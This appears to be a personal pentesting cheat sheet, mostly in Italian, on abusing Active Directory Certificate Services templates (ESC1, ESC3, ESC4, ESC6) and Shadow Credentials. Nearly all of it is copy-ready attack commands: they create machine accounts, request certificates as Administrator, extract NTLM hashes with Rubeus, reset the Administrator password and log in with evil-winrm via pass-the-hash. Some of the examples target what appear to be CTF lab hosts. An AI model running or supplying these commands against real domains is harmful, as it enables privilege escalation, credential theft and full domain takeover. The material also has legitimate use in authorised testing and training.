### **ENUMERAZIONE**
Cerca un template vulnerabile
```bash
certipy-ad find -u <USER> -p <PASS> -dc-ip <IP> -vulnerable -stdout
```
```powershell
./Certify.exe find /vulnerable
```
![[Pasted image 20230719143059.png]]
### **EXPLOIT ESC 1**
Hai la possibilità di enroll

```bash
impacket-addcomputer  <DOMINIO>/<USER>:'<PASS>' -computer-name testComputer2$ -computer-pass TestPassword321
```
![[Pasted image 20230719143908.png]]
controllo se è stato creato
```bash
crackmapexec smb <IP> -u 'testComputer2$' -p 'TestPassword321' -d <DOMINIO>
```
![[Pasted image 20230719150304.png]]
Generiamo un certificato per l'account appena creatp
```bash
certipy req -u 'testComputer2$' -p 'TestPassword321' -dc-ip IP_DC_HERE -ca AUTHORITY-CA -template '<TEMPLATE>' -upn 'Administrator'
```
![[Pasted image 20230719150515.png]]
Ora dividi il certificato
```bash
certipy cert -pfx administrator.pfx -nokey -out user.crt
certipy cert -pfx administrator.pfx -nocert -out user.key
```
Usa il seguente tool per accere con il certificato
[PassTheCert/Python at main · AlmondOffSec/PassTheCert · GitHub](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python)
```bash
python3 passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip IP_DC_HERE -target administrator -new-pass
```
![[Pasted image 20230719150944.png]]
Entra con evil-winrm
### **EXPLOIT ESC 3**
Richiedi il certificato
```BASH
certipy-ad req -username <USER>@<IP> -password <PASS> -ca <NOME-CA> -target <NOME MACCHINA> -template <TEMPLATE LOCALE> -upn <USER DA PRENDERE>@<IP> -dns <NOME MACCHINA> -debug
```
```POWERSHELL
Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:<TEMPLATE VULNERABILE> /altname:<TEMPLATE DA PRENDERE>
```
converti chiave e certificato in formato pfx12
```bash
openssl pkcs12 -in cert.pem -inkey private.key -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
Carica rubeus e il cert.pfx sulla macchina e prendi l'hash ntlm
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```
![[Pasted image 20230719143559.png]]
Usa l'hash per loggare tramite evil-winrm
```bash
evil-winrm -i 10.10.11.202 -u Administrator -H <HASH>
```
### **ESC 4 - ADCS**
Grazie al permesso genericWrite possiamo modificare il nostro template per renderlo vulnerabile all'ESC1
```bash
certipy-ad template -u <USER>@<DOMAIN> -p '<PASS>' -template <NOME TEMPLATE> -save-old -debug
```
![[Pasted image 20230828151521.png]]
Poi exploitalo come ESC1.
Per riportarlo alla normalità
```bash
certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
```
![[Pasted image 20230828151547.png]]

### **ESC6**
The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set.
```cmd
C:\AD\Tools\Certify.exe cas
```
![[Pasted image 20231115141409.png]]
Look for a template that allow enrollment for normal user
```cmd
C:\AD\Tools\Certify.exe find
```
and request a certificate as any user you want using the "CA-integration" template
```cmd
C:\AD\Tools\Certify.exe request /ca:<DC.DOMAIN>\<CA> /template:"CA-Integration" /altname:<DOMAIN>\administrator
```
![[Pasted image 20231115142421.png]]
Save it and convert it
```cmd
C:\AD\Tools\openssl\openssl.exe pkcs12 -in <CERT> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <PFX>
```
![[Pasted image 20231115142542.png]]
Now use it with Rubeus to gain access
```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:<DOMAIN>\administrator /certificate:<PFX> /dc:<MACHINE> /password:<CHOOSEN PASSWORD> /ptt
```
![[Pasted image 20231115142707.png]]

### **Shadow Credentials**
[Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
Stealth e molto utile in caso di vero pentest.
Ha bisogno dell'opzione msDS-KeyCredentialLink abilitata sull'account (Se hai genericWrite o genericAll su un account puoi abilitarla da solo)
```bash
certipy-ad shadow auto -u <USER>@<DOMAIN> -p '<PASS>' -account '<NOME TARGET>'
```
![[Pasted image 20230828173854.png]]